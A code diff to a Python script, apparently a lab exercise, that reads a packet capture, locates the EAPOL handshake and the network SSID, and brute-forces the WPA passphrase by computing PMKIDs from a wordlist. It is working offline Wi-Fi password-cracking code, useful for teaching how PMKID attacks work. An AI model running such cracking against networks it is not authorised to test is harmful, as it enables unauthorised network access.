@@ -9,10 +9,26 @@ import hmac, hashlib
 
 packets = rdpcap("PMKID_handshake.pcap")
 
-ssid        = packets[126].info.decode("utf-8")
+handshake = None
 APmac       = a2b_hex(packets[145].addr3.replace(':',''))
 Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
 pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]
+ssid = None
+
+def findSSID():
+    for pkt in packets:
+        if pkt.type == 0 and pkt.subtype == 8:
+            if pkt.addr2 == handshake.addr2:
+                return pkt.info
+
+
+#find a packet which has a pmkid
+for packet in packets:
+    if packet.haslayer(EAPOL):
+        handshake = packet
+        ssid = findSSID()
+        if ssid != None:
+            break
 
 # read wordlist line by line
 with open('wordlist.txt') as fp:
@@ -21,7 +37,7 @@ with open('wordlist.txt') as fp:
     while passPhrase:
         pp_encoded = str.encode(passPhrase)
         # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)
+        pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), ssid, 4096, 32)
         # compute the PMKID with the tested passphrase
         computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]
 
